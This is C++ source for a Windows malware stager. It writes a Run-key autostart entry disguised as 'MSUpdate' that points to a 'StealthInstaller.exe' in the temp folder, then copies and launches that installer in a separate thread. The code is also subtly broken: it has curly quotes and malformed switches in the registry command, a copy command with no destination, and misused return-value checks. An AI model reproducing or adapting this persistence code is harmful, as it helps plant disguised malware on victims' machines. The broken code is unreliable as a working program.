#include <iostream>
#include <Windows.h>
#define INSTALLER_NAME "StealthInstaller.exe"
char TemporaryPath[MAX_PATH + sizeof(INSTALLER_NAME) + 1] = { 0 };


DWORD InstallerThread(LPVOID lpThreadParameter) {
	system(TemporaryPath);
	return 0;
}


int main() {
	char StagerName[MAX_PATH] = { 0 };
	char DrivePrefix[3] = { 0 };
	std::string RegistryCommand(R"(reg add “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” / v MSUpdate / t REG_SZ / d )");
	std::string CopyCommand("copy ");


	// Create path in registry:
	DWORD LastError = GetTempPathA(MAX_PATH + sizeof(INSTALLER_NAME) + 1, TemporaryPath);
	if (LastError != ERROR_SUCCESS) {
		return LastError;
	}
	strcat_s(TemporaryPath, INSTALLER_NAME);
	RegistryCommand += TemporaryPath + std::string(R"(” /f)");
	system(RegistryCommand.c_str());


	// Copy installer into the right path
	LastError = GetModuleFileNameA(NULL, StagerName, MAX_PATH);
	if (LastError != ERROR_SUCCESS) {
		return LastError;
	}
	DrivePrefix[0] = StagerName[0];
	DrivePrefix[1] = ':';
	DrivePrefix[2] = '\\';
	CopyCommand += DrivePrefix;
	CopyCommand += INSTALLER_NAME;
	system(CopyCommand.c_str());


	// Execute installer in another thread and wait for it to finish:
	HANDLE ThreadHandle = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		InstallerThread,       // thread function name
		NULL,          // argument to thread function 
		0,                      // use default creation flags 
		NULL);   // returns the thread identifier
	if (ThreadHandle == NULL) {
		return GetLastError();
	}
	LastError = WaitForSingleObject(ThreadHandle, INFINITE);
	return LastError;
}